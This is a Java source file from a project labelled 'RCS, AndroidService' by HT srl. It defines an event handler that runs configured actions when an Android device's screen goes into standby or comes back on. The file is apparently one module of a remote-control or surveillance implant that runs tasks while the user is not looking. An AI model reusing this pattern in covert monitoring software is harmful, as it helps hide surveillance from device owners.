/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import android.util.Log;

import com.android.service.Standby;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerStandby;
import com.android.service.util.DataBuffer;

public class EventStandby extends EventBase implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "EventStandby";

	private int actionOnEnter, actionOnExit;

	@Override
	public void begin() {
		ListenerStandby.self().attach(this);
	}

	@Override
	public void end() {
		ListenerStandby.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();

			if(Cfg.DEBUG) Log.d("QZ", TAG + " exitAction: " + actionOnExit);
		} catch (final IOException e) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}

		return true;
	}

	@Override
	public void go() {
		
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Standby s) {
		// Stato dello schermo ON/OFF
		if (s.getStatus() == true) {
			// SCREEN ON			
			onExit();
		} else { 
			// STANDBY			
			onEnter();
		}
		
		return 0;
	}
	
	public void onEnter() {
		trigger(actionOnEnter);
	}

	public void onExit() {
		trigger(actionOnExit);
	}
}
